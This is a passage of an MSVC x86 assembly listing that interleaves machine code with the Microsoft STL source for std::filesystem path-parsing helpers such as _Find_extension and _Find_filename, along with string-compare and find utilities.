  0004c	b8 02 00 00 00	 mov	 eax, 2
  00051	d1 e0		 shl	 eax, 1
  00053	8b 4d 08	 mov	 ecx, DWORD PTR __Data$[ebp]
  00056	0f b7 54 01 2c	 movzx	 edx, WORD PTR [ecx+eax+44]
  0005b	85 d2		 test	 edx, edx
  0005d	75 09		 jne	 SHORT $LN6@Is_dot_or_
  0005f	c7 45 f8 01 00
	00 00		 mov	 DWORD PTR tv81[ebp], 1
  00066	eb 07		 jmp	 SHORT $LN7@Is_dot_or_
$LN6@Is_dot_or_:
  00068	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv81[ebp], 0
$LN7@Is_dot_or_:
  0006f	8a 45 f8	 mov	 al, BYTE PTR tv81[ebp]
$LN1@Is_dot_or_:

; 590  :     }

  00072	8b e5		 mov	 esp, ebp
  00074	5d		 pop	 ebp
  00075	c3		 ret	 0
?_Is_dot_or_dotdot@filesystem@std@@YA_NABU__std_fs_find_data@@@Z ENDP ; std::filesystem::_Is_dot_or_dotdot
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Traits_compare@U?$char_traits@_W@std@@@std@@YAHQB_WI0I@Z
_TEXT	SEGMENT
__Ans$ = -4						; size = 4
__Left$ = 8						; size = 4
__Left_size$ = 12					; size = 4
__Right$ = 16						; size = 4
__Right_size$ = 20					; size = 4
??$_Traits_compare@U?$char_traits@_W@std@@@std@@YAHQB_WI0I@Z PROC ; std::_Traits_compare<std::char_traits<wchar_t> >, COMDAT

; 551  :     _In_reads_(_Right_size) const _Traits_ptr_t<_Traits> _Right, const size_t _Right_size) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 552  :     // compare [_Left, _Left + _Left_size) to [_Right, _Right + _Right_size) using _Traits
; 553  :     const int _Ans = _Traits::compare(_Left, _Right, (_STD min)(_Left_size, _Right_size));

  00004	8d 45 14	 lea	 eax, DWORD PTR __Right_size$[ebp]
  00007	50		 push	 eax
  00008	8d 4d 0c	 lea	 ecx, DWORD PTR __Left_size$[ebp]
  0000b	51		 push	 ecx
  0000c	e8 00 00 00 00	 call	 ??$min@I@std@@YAABIABI0@Z ; std::min<unsigned int>
  00011	83 c4 08	 add	 esp, 8
  00014	8b 10		 mov	 edx, DWORD PTR [eax]
  00016	52		 push	 edx
  00017	8b 45 10	 mov	 eax, DWORD PTR __Right$[ebp]
  0001a	50		 push	 eax
  0001b	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0001e	51		 push	 ecx
  0001f	e8 00 00 00 00	 call	 ?compare@?$_WChar_traits@_W@std@@SAHQB_W0I@Z ; std::_WChar_traits<wchar_t>::compare
  00024	83 c4 0c	 add	 esp, 12			; 0000000cH
  00027	89 45 fc	 mov	 DWORD PTR __Ans$[ebp], eax

; 554  : 
; 555  :     if (_Ans != 0) {

  0002a	83 7d fc 00	 cmp	 DWORD PTR __Ans$[ebp], 0
  0002e	74 05		 je	 SHORT $LN2@Traits_com

; 556  :         return _Ans;

  00030	8b 45 fc	 mov	 eax, DWORD PTR __Ans$[ebp]
  00033	eb 1e		 jmp	 SHORT $LN1@Traits_com
$LN2@Traits_com:

; 557  :     }
; 558  : 
; 559  :     if (_Left_size < _Right_size) {

  00035	8b 55 0c	 mov	 edx, DWORD PTR __Left_size$[ebp]
  00038	3b 55 14	 cmp	 edx, DWORD PTR __Right_size$[ebp]
  0003b	73 05		 jae	 SHORT $LN3@Traits_com

; 560  :         return -1;

  0003d	83 c8 ff	 or	 eax, -1
  00040	eb 11		 jmp	 SHORT $LN1@Traits_com
$LN3@Traits_com:

; 561  :     }
; 562  : 
; 563  :     if (_Left_size > _Right_size) {

  00042	8b 45 0c	 mov	 eax, DWORD PTR __Left_size$[ebp]
  00045	3b 45 14	 cmp	 eax, DWORD PTR __Right_size$[ebp]
  00048	76 07		 jbe	 SHORT $LN4@Traits_com

; 564  :         return 1;

  0004a	b8 01 00 00 00	 mov	 eax, 1
  0004f	eb 02		 jmp	 SHORT $LN1@Traits_com
$LN4@Traits_com:

; 565  :     }
; 566  : 
; 567  :     return 0;

  00051	33 c0		 xor	 eax, eax
$LN1@Traits_com:

; 568  : }

  00053	8b e5		 mov	 esp, ebp
  00055	5d		 pop	 ebp
  00056	c3		 ret	 0
??$_Traits_compare@U?$char_traits@_W@std@@@std@@YAHQB_WI0I@Z ENDP ; std::_Traits_compare<std::char_traits<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Range_compare@filesystem@std@@YAHQB_W000@Z
_TEXT	SEGMENT
__Lfirst$ = 8						; size = 4
__Llast$ = 12						; size = 4
__Rfirst$ = 16						; size = 4
__Rlast$ = 20						; size = 4
?_Range_compare@filesystem@std@@YAHQB_W000@Z PROC	; std::filesystem::_Range_compare, COMDAT

; 563  :         const wchar_t* const _Rfirst, const wchar_t* const _Rlast) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 564  :         // 3 way compare [_Lfirst, _Llast) with [_Rfirst, _Rlast)
; 565  :         return _Traits_compare<char_traits<wchar_t>>(

  00003	8b 45 14	 mov	 eax, DWORD PTR __Rlast$[ebp]
  00006	2b 45 10	 sub	 eax, DWORD PTR __Rfirst$[ebp]
  00009	d1 f8		 sar	 eax, 1
  0000b	50		 push	 eax
  0000c	8b 4d 10	 mov	 ecx, DWORD PTR __Rfirst$[ebp]
  0000f	51		 push	 ecx
  00010	8b 55 0c	 mov	 edx, DWORD PTR __Llast$[ebp]
  00013	2b 55 08	 sub	 edx, DWORD PTR __Lfirst$[ebp]
  00016	d1 fa		 sar	 edx, 1
  00018	52		 push	 edx
  00019	8b 45 08	 mov	 eax, DWORD PTR __Lfirst$[ebp]
  0001c	50		 push	 eax
  0001d	e8 00 00 00 00	 call	 ??$_Traits_compare@U?$char_traits@_W@std@@@std@@YAHQB_WI0I@Z ; std::_Traits_compare<std::char_traits<wchar_t> >
  00022	83 c4 10	 add	 esp, 16			; 00000010H

; 566  :             _Lfirst, static_cast<size_t>(_Llast - _Lfirst), _Rfirst, static_cast<size_t>(_Rlast - _Rfirst));
; 567  :     }

  00025	5d		 pop	 ebp
  00026	c3		 ret	 0
?_Range_compare@filesystem@std@@YAHQB_W000@Z ENDP	; std::filesystem::_Range_compare
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Parse_extension@filesystem@std@@YA?AV?$basic_string_view@_WU?$char_traits@_W@std@@@2@V32@@Z
_TEXT	SEGMENT
__Extension$ = -24					; size = 4
__Ads$ = -20						; size = 4
__Filename$ = -16					; size = 4
__Last$ = -12						; size = 4
__First$ = -8						; size = 4
$T1 = -2						; size = 2
___$ReturnUdt$ = 8					; size = 4
__Str$ = 12						; size = 8
?_Parse_extension@filesystem@std@@YA?AV?$basic_string_view@_WU?$char_traits@_W@std@@@2@V32@@Z PROC ; std::filesystem::_Parse_extension, COMDAT

; 551  :     _NODISCARD inline wstring_view _Parse_extension(const wstring_view _Str) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H

; 552  :         // attempt to parse _Str as a path and return the extension if it exists; otherwise, an empty view
; 553  :         const auto _First    = _Str.data();

  00006	8d 4d 0c	 lea	 ecx, DWORD PTR __Str$[ebp]
  00009	e8 00 00 00 00	 call	 ?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data
  0000e	89 45 f8	 mov	 DWORD PTR __First$[ebp], eax

; 554  :         const auto _Last     = _First + _Str.size();

  00011	8d 4d 0c	 lea	 ecx, DWORD PTR __Str$[ebp]
  00014	e8 00 00 00 00	 call	 ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
  00019	8b 4d f8	 mov	 ecx, DWORD PTR __First$[ebp]
  0001c	8d 14 41	 lea	 edx, DWORD PTR [ecx+eax*2]
  0001f	89 55 f4	 mov	 DWORD PTR __Last$[ebp], edx

; 555  :         const auto _Filename = _Find_filename(_First, _Last);

  00022	8b 45 f4	 mov	 eax, DWORD PTR __Last$[ebp]
  00025	50		 push	 eax
  00026	8b 4d f8	 mov	 ecx, DWORD PTR __First$[ebp]
  00029	51		 push	 ecx
  0002a	e8 00 00 00 00	 call	 ?_Find_filename@filesystem@std@@YAPB_WQB_WPB_W@Z ; std::filesystem::_Find_filename
  0002f	83 c4 08	 add	 esp, 8
  00032	89 45 f0	 mov	 DWORD PTR __Filename$[ebp], eax

; 556  :         const auto _Ads =

  00035	ba 3a 00 00 00	 mov	 edx, 58			; 0000003aH
  0003a	66 89 55 fe	 mov	 WORD PTR $T1[ebp], dx
  0003e	8d 45 fe	 lea	 eax, DWORD PTR $T1[ebp]
  00041	50		 push	 eax
  00042	8b 4d f4	 mov	 ecx, DWORD PTR __Last$[ebp]
  00045	51		 push	 ecx
  00046	8b 55 f0	 mov	 edx, DWORD PTR __Filename$[ebp]
  00049	52		 push	 edx
  0004a	e8 00 00 00 00	 call	 ??$find@PB_W_W@std@@YAPB_WPB_WQB_WAB_W@Z ; std::find<wchar_t const *,wchar_t>
  0004f	83 c4 0c	 add	 esp, 12			; 0000000cH
  00052	89 45 ec	 mov	 DWORD PTR __Ads$[ebp], eax

; 557  :             _STD find(_Filename, _Last, L':'); // strip alternate data streams in intra-filename decomposition
; 558  :         const auto _Extension = _Find_extension(_Filename, _Ads);

  00055	8b 45 ec	 mov	 eax, DWORD PTR __Ads$[ebp]
  00058	50		 push	 eax
  00059	8b 4d f0	 mov	 ecx, DWORD PTR __Filename$[ebp]
  0005c	51		 push	 ecx
  0005d	e8 00 00 00 00	 call	 ?_Find_extension@filesystem@std@@YAPB_WQB_W0@Z ; std::filesystem::_Find_extension
  00062	83 c4 08	 add	 esp, 8
  00065	89 45 e8	 mov	 DWORD PTR __Extension$[ebp], eax

; 559  :         return wstring_view(_Extension, static_cast<size_t>(_Ads - _Extension));

  00068	8b 55 ec	 mov	 edx, DWORD PTR __Ads$[ebp]
  0006b	2b 55 e8	 sub	 edx, DWORD PTR __Extension$[ebp]
  0006e	d1 fa		 sar	 edx, 1
  00070	52		 push	 edx
  00071	8b 45 e8	 mov	 eax, DWORD PTR __Extension$[ebp]
  00074	50		 push	 eax
  00075	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00078	e8 00 00 00 00	 call	 ??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_WI@Z ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >
  0007d	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 560  :     }

  00080	8b e5		 mov	 esp, ebp
  00082	5d		 pop	 ebp
  00083	c3		 ret	 0
?_Parse_extension@filesystem@std@@YA?AV?$basic_string_view@_WU?$char_traits@_W@std@@@2@V32@@Z ENDP ; std::filesystem::_Parse_extension
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$find@PB_W_W@std@@YAPB_WPB_WQB_WAB_W@Z
_TEXT	SEGMENT
$T1 = -12						; size = 4
tv75 = -8						; size = 4
tv77 = -4						; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
__Val$ = 16						; size = 4
??$find@PB_W_W@std@@YAPB_WPB_WQB_WAB_W@Z PROC		; std::find<wchar_t const *,wchar_t>, COMDAT

; 5812 : _NODISCARD _CONSTEXPR20 _InIt find(_InIt _First, const _InIt _Last, const _Ty& _Val) { // find first matching _Val

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH

; 5813 :     _Adl_verify_range(_First, _Last);

  00006	8d 45 0c	 lea	 eax, DWORD PTR __Last$[ebp]
  00009	50		 push	 eax
  0000a	8d 4d 08	 lea	 ecx, DWORD PTR __First$[ebp]
  0000d	51		 push	 ecx
  0000e	e8 00 00 00 00	 call	 ??$_Adl_verify_range@PB_WPB_W@std@@YAXABQB_W0@Z ; std::_Adl_verify_range<wchar_t const *,wchar_t const *>
  00013	83 c4 08	 add	 esp, 8

; 5814 :     if constexpr (_Is_vb_iterator<_InIt> && is_same_v<_Ty, bool>) {
; 5815 :         return _Find_vbool(_First, _Last, _Val);
; 5816 :     } else {
; 5817 :         _Seek_wrapped(_First, _STD _Find_unchecked(_Get_unwrapped(_First), _Get_unwrapped(_Last), _Val));

  00016	8d 55 0c	 lea	 edx, DWORD PTR __Last$[ebp]
  00019	52		 push	 edx
  0001a	e8 00 00 00 00	 call	 ??$_Get_unwrapped@ABQB_W@std@@YA?A_TABQB_W@Z ; std::_Get_unwrapped<wchar_t const * const &>
  0001f	83 c4 04	 add	 esp, 4
  00022	89 45 fc	 mov	 DWORD PTR tv77[ebp], eax
  00025	8d 45 08	 lea	 eax, DWORD PTR __First$[ebp]
  00028	50		 push	 eax
  00029	e8 00 00 00 00	 call	 ??$_Get_unwrapped@AAPB_W@std@@YA?A_TAAPB_W@Z ; std::_Get_unwrapped<wchar_t const * &>
  0002e	83 c4 04	 add	 esp, 4
  00031	89 45 f8	 mov	 DWORD PTR tv75[ebp], eax
  00034	8b 4d 10	 mov	 ecx, DWORD PTR __Val$[ebp]
  00037	51		 push	 ecx
  00038	8b 55 fc	 mov	 edx, DWORD PTR tv77[ebp]
  0003b	52		 push	 edx
  0003c	8b 45 f8	 mov	 eax, DWORD PTR tv75[ebp]
  0003f	50		 push	 eax
  00040	e8 00 00 00 00	 call	 ??$_Find_unchecked@PB_W_W@std@@YAPB_WPB_WQB_WAB_W@Z ; std::_Find_unchecked<wchar_t const *,wchar_t>
  00045	83 c4 0c	 add	 esp, 12			; 0000000cH
  00048	89 45 f4	 mov	 DWORD PTR $T1[ebp], eax
  0004b	8d 4d f4	 lea	 ecx, DWORD PTR $T1[ebp]
  0004e	51		 push	 ecx
  0004f	8d 55 08	 lea	 edx, DWORD PTR __First$[ebp]
  00052	52		 push	 edx
  00053	e8 00 00 00 00	 call	 ??$_Seek_wrapped@PB_WPB_W@std@@YAXAAPB_W$$QAPB_W@Z ; std::_Seek_wrapped<wchar_t const *,wchar_t const *>
  00058	83 c4 08	 add	 esp, 8

; 5818 :         return _First;

  0005b	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]

; 5819 :     }
; 5820 : }

  0005e	8b e5		 mov	 esp, ebp
  00060	5d		 pop	 ebp
  00061	c3		 ret	 0
??$find@PB_W_W@std@@YAPB_WPB_WQB_WAB_W@Z ENDP		; std::find<wchar_t const *,wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Find_extension@filesystem@std@@YAPB_WQB_W0@Z
_TEXT	SEGMENT
__Extension$ = -4					; size = 4
__Filename$ = 8						; size = 4
__Ads$ = 12						; size = 4
?_Find_extension@filesystem@std@@YAPB_WQB_W0@Z PROC	; std::filesystem::_Find_extension, COMDAT

; 508  :     _NODISCARD constexpr const wchar_t* _Find_extension(const wchar_t* const _Filename, const wchar_t* const _Ads) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 509  :         // find dividing point between stem and extension in a generic format filename consisting of [_Filename, _Ads)
; 510  :         auto _Extension = _Ads;

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Ads$[ebp]
  00007	89 45 fc	 mov	 DWORD PTR __Extension$[ebp], eax

; 511  :         if (_Filename == _Extension) { // empty path

  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Filename$[ebp]
  0000d	3b 4d fc	 cmp	 ecx, DWORD PTR __Extension$[ebp]
  00010	75 05		 jne	 SHORT $LN4@Find_exten

; 512  :             return _Ads;

  00012	8b 45 0c	 mov	 eax, DWORD PTR __Ads$[ebp]
  00015	eb 72		 jmp	 SHORT $LN1@Find_exten
$LN4@Find_exten:

; 513  :         }
; 514  : 
; 515  :         --_Extension;

  00017	8b 55 fc	 mov	 edx, DWORD PTR __Extension$[ebp]
  0001a	83 ea 02	 sub	 edx, 2
  0001d	89 55 fc	 mov	 DWORD PTR __Extension$[ebp], edx

; 516  :         if (_Filename == _Extension) {

  00020	8b 45 08	 mov	 eax, DWORD PTR __Filename$[ebp]
  00023	3b 45 fc	 cmp	 eax, DWORD PTR __Extension$[ebp]
  00026	75 05		 jne	 SHORT $LN5@Find_exten

; 517  :             // path is length 1 and either dot, or has no dots; either way, extension() is empty
; 518  :             return _Ads;

  00028	8b 45 0c	 mov	 eax, DWORD PTR __Ads$[ebp]
  0002b	eb 5c		 jmp	 SHORT $LN1@Find_exten
$LN5@Find_exten:

; 519  :         }
; 520  : 
; 521  :         if (*_Extension == L'.') { // we might have found the end of stem

  0002d	8b 4d fc	 mov	 ecx, DWORD PTR __Extension$[ebp]
  00030	0f b7 11	 movzx	 edx, WORD PTR [ecx]
  00033	83 fa 2e	 cmp	 edx, 46			; 0000002eH
  00036	75 2b		 jne	 SHORT $LN8@Find_exten

; 522  :             if (_Filename == _Extension - 1 && _Extension[-1] == L'.') { // dotdot special case

  00038	8b 45 fc	 mov	 eax, DWORD PTR __Extension$[ebp]
  0003b	83 e8 02	 sub	 eax, 2
  0003e	39 45 08	 cmp	 DWORD PTR __Filename$[ebp], eax
  00041	75 1b		 jne	 SHORT $LN7@Find_exten
  00043	b9 02 00 00 00	 mov	 ecx, 2
  00048	6b d1 ff	 imul	 edx, ecx, -1
  0004b	8b 45 fc	 mov	 eax, DWORD PTR __Extension$[ebp]
  0004e	0f b7 0c 10	 movzx	 ecx, WORD PTR [eax+edx]
  00052	83 f9 2e	 cmp	 ecx, 46			; 0000002eH
  00055	75 07		 jne	 SHORT $LN7@Find_exten

; 523  :                 return _Ads;

  00057	8b 45 0c	 mov	 eax, DWORD PTR __Ads$[ebp]
  0005a	eb 2d		 jmp	 SHORT $LN1@Find_exten

; 524  :             } else { // x.

  0005c	eb 05		 jmp	 SHORT $LN8@Find_exten
$LN7@Find_exten:

; 525  :                 return _Extension;

  0005e	8b 45 fc	 mov	 eax, DWORD PTR __Extension$[ebp]
  00061	eb 26		 jmp	 SHORT $LN1@Find_exten
$LN8@Find_exten:

; 526  :             }
; 527  :         }
; 528  : 
; 529  :         while (_Filename != --_Extension) {

  00063	8b 55 fc	 mov	 edx, DWORD PTR __Extension$[ebp]
  00066	83 ea 02	 sub	 edx, 2
  00069	89 55 fc	 mov	 DWORD PTR __Extension$[ebp], edx
  0006c	8b 45 08	 mov	 eax, DWORD PTR __Filename$[ebp]
  0006f	3b 45 fc	 cmp	 eax, DWORD PTR __Extension$[ebp]
  00072	74 12		 je	 SHORT $LN3@Find_exten

; 530  :             if (*_Extension == L'.') { // found a dot which is not in first position, so it starts extension()

  00074	8b 4d fc	 mov	 ecx, DWORD PTR __Extension$[ebp]
  00077	0f b7 11	 movzx	 edx, WORD PTR [ecx]
  0007a	83 fa 2e	 cmp	 edx, 46			; 0000002eH
  0007d	75 05		 jne	 SHORT $LN9@Find_exten

; 531  :                 return _Extension;

  0007f	8b 45 fc	 mov	 eax, DWORD PTR __Extension$[ebp]
  00082	eb 05		 jmp	 SHORT $LN1@Find_exten
$LN9@Find_exten:

; 532  :             }
; 533  :         }

  00084	eb dd		 jmp	 SHORT $LN8@Find_exten
$LN3@Find_exten:

; 534  : 
; 535  :         // if we got here, either there are no dots, in which case extension is empty, or the first element
; 536  :         // is a dot, in which case we have the leading single dot special case, which also makes extension empty
; 537  :         return _Ads;

  00086	8b 45 0c	 mov	 eax, DWORD PTR __Ads$[ebp]
$LN1@Find_exten:

; 538  :     }

  00089	8b e5		 mov	 esp, ebp
  0008b	5d		 pop	 ebp
  0008c	c3		 ret	 0
?_Find_extension@filesystem@std@@YAPB_WQB_W0@Z ENDP	; std::filesystem::_Find_extension
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Find_filename@filesystem@std@@YAPB_WQB_WPB_W@Z
_TEXT	SEGMENT
__Relative_path$ = -4					; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
?_Find_filename@filesystem@std@@YAPB_WQB_WPB_W@Z PROC	; std::filesystem::_Find_filename, COMDAT

; 490  :     _NODISCARD inline const wchar_t* _Find_filename(const wchar_t* const _First, const wchar_t* _Last) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 491  :         // attempt to parse [_First, _Last) as a path and return the start of filename if it exists; otherwise, _Last
; 492  :         const auto _Relative_path = _Find_relative_path(_First, _Last);

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Last$[ebp]
  00007	50		 push	 eax
  00008	8b 4d 08	 mov	 ecx, DWORD PTR __First$[ebp]
  0000b	51		 push	 ecx
  0000c	e8 00 00 00 00	 call	 ?_Find_relative_path@filesystem@std@@YAPB_WQB_W0@Z ; std::filesystem::_Find_relative_path
  00011	83 c4 08	 add	 esp, 8
  00014	89 45 fc	 mov	 DWORD PTR __Relative_path$[ebp], eax
$LN2@Find_filen:

; 493  :         while (_Relative_path != _Last && !_Is_slash(_Last[-1])) {

  00017	8b 55 fc	 mov	 edx, DWORD PTR __Relative_path$[ebp]
  0001a	3b 55 0c	 cmp	 edx, DWORD PTR __Last$[ebp]
  0001d	74 2c		 je	 SHORT $LN3@Find_filen
  0001f	b8 02 00 00 00	 mov	 eax, 2
  00024	6b c8 ff	 imul	 ecx, eax, -1
  00027	8b 55 0c	 mov	 edx, DWORD PTR __Last$[ebp]
  0002a	0f b7 04 0a	 movzx	 eax, WORD PTR [edx+ecx]
  0002e	50		 push	 eax
  0002f	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  00034	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  00039	0f b6 c8	 movzx	 ecx, al
  0003c	85 c9		 test	 ecx, ecx
  0003e	75 0b		 jne	 SHORT $LN3@Find_filen

; 494  :             --_Last;

  00040	8b 55 0c	 mov	 edx, DWORD PTR __Last$[ebp]
  00043	83 ea 02	 sub	 edx, 2
  00046	89 55 0c	 mov	 DWORD PTR __Last$[ebp], edx

; 495  :         }

  00049	eb cc		 jmp	 SHORT $LN2@Find_filen
$LN3@Find_filen:

; 496  : 
; 497  :         return _Last;

  0004b	8b 45 0c	 mov	 eax, DWORD PTR __Last$[ebp]

; 498  :     }

  0004e	8b e5		 mov	 esp, ebp
  00050	5d		 pop	 ebp
  00051	c3		 ret	 0
?_Find_filename@filesystem@std@@YAPB_WQB_WPB_W@Z ENDP	; std::filesystem::_Find_filename
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\algorithm
;	COMDAT ??$find_if_not@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z
_TEXT	SEGMENT
__ULast$ = -8						; size = 4
__UFirst$ = -4						; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
__Pred$ = 16						; size = 1
??$find_if_not@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z PROC ; std::find_if_not<wchar_t const *,std::filesystem::_Is_slash_oper>, COMDAT

; 399  : _NODISCARD _CONSTEXPR20 _InIt find_if_not(_InIt _First, const _InIt _Last, _Pr _Pred) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 400  :     // find first element that satisfies !_Pred
; 401  :     _Adl_verify_range(_First, _Last);

  00006	8d 45 0c	 lea	 eax, DWORD PTR __Last$[ebp]
  00009	50		 push	 eax
  0000a	8d 4d 08	 lea	 ecx, DWORD PTR __First$[ebp]
  0000d	51		 push	 ecx
  0000e	e8 00 00 00 00	 call	 ??$_Adl_verify_range@PB_WPB_W@std@@YAXABQB_W0@Z ; std::_Adl_verify_range<wchar_t const *,wchar_t const *>
  00013	83 c4 08	 add	 esp, 8

; 402  :     auto _UFirst      = _Get_unwrapped(_First);

  00016	8d 55 08	 lea	 edx, DWORD PTR __First$[ebp]
  00019	52		 push	 edx
  0001a	e8 00 00 00 00	 call	 ??$_Get_unwrapped@AAPB_W@std@@YA?A_TAAPB_W@Z ; std::_Get_unwrapped<wchar_t const * &>
  0001f	83 c4 04	 add	 esp, 4
  00022	89 45 fc	 mov	 DWORD PTR __UFirst$[ebp], eax

; 403  :     const auto _ULast = _Get_unwrapped(_Last);

  00025	8d 45 0c	 lea	 eax, DWORD PTR __Last$[ebp]
  00028	50		 push	 eax
  00029	e8 00 00 00 00	 call	 ??$_Get_unwrapped@ABQB_W@std@@YA?A_TABQB_W@Z ; std::_Get_unwrapped<wchar_t const * const &>
  0002e	83 c4 04	 add	 esp, 4
  00031	89 45 f8	 mov	 DWORD PTR __ULast$[ebp], eax

; 404  :     for (; _UFirst != _ULast; ++_UFirst) {

  00034	eb 09		 jmp	 SHORT $LN4@find_if_no
$LN2@find_if_no:
  00036	8b 4d fc	 mov	 ecx, DWORD PTR __UFirst$[ebp]
  00039	83 c1 02	 add	 ecx, 2
  0003c	89 4d fc	 mov	 DWORD PTR __UFirst$[ebp], ecx
$LN4@find_if_no:
  0003f	8b 55 fc	 mov	 edx, DWORD PTR __UFirst$[ebp]
  00042	3b 55 f8	 cmp	 edx, DWORD PTR __ULast$[ebp]
  00045	74 1a		 je	 SHORT $LN3@find_if_no

; 405  :         if (!_Pred(*_UFirst)) {

  00047	8b 45 fc	 mov	 eax, DWORD PTR __UFirst$[ebp]
  0004a	0f b7 08	 movzx	 ecx, WORD PTR [eax]
  0004d	51		 push	 ecx
  0004e	8d 4d 10	 lea	 ecx, DWORD PTR __Pred$[ebp]
  00051	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  00056	0f b6 d0	 movzx	 edx, al
  00059	85 d2		 test	 edx, edx
  0005b	75 02		 jne	 SHORT $LN5@find_if_no

; 406  :             break;

  0005d	eb 02		 jmp	 SHORT $LN3@find_if_no
$LN5@find_if_no:

; 407  :         }
; 408  :     }

  0005f	eb d5		 jmp	 SHORT $LN2@find_if_no
$LN3@find_if_no:

; 409  : 
; 410  :     _Seek_wrapped(_First, _UFirst);

  00061	8d 45 fc	 lea	 eax, DWORD PTR __UFirst$[ebp]
  00064	50		 push	 eax
  00065	8d 4d 08	 lea	 ecx, DWORD PTR __First$[ebp]
  00068	51		 push	 ecx
  00069	e8 00 00 00 00	 call	 ??$_Seek_wrapped@PB_WAAPB_W@std@@YAXAAPB_W0@Z ; std::_Seek_wrapped<wchar_t const *,wchar_t const * &>
  0006e	83 c4 08	 add	 esp, 8

; 411  :     return _First;

  00071	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]

; 412  : }

  00074	8b e5		 mov	 esp, ebp
  00076	5d		 pop	 ebp
  00077	c3		 ret	 0
??$find_if_not@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z ENDP ; std::find_if_not<wchar_t const *,std::filesystem::_Is_slash_oper>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Find_relative_path@filesystem@std@@YAPB_WQB_W0@Z
_TEXT	SEGMENT
tv72 = -8						; size = 4
$T1 = -1						; size = 1
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
?_Find_relative_path@filesystem@std@@YAPB_WQB_W0@Z PROC	; std::filesystem::_Find_relative_path, COMDAT

; 439  :     _NODISCARD inline const wchar_t* _Find_relative_path(const wchar_t* const _First, const wchar_t* const _Last) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 440  :         // attempt to parse [_First, _Last) as a path and return the start of relative-path
; 441  :         return _STD find_if_not(_Find_root_name_end(_First, _Last), _Last, _Is_slash);

  00006	0f b6 05 00 00
	00 00		 movzx	 eax, BYTE PTR ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  0000d	88 45 ff	 mov	 BYTE PTR $T1[ebp], al
  00010	8b 4d 0c	 mov	 ecx, DWORD PTR __Last$[ebp]
  00013	51		 push	 ecx
  00014	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  00017	52		 push	 edx
  00018	e8 00 00 00 00	 call	 ?_Find_root_name_end@filesystem@std@@YAPB_WQB_W0@Z ; std::filesystem::_Find_root_name_end
  0001d	83 c4 08	 add	 esp, 8
  00020	89 45 f8	 mov	 DWORD PTR tv72[ebp], eax
  00023	0f b6 45 ff	 movzx	 eax, BYTE PTR $T1[ebp]
  00027	50		 push	 eax
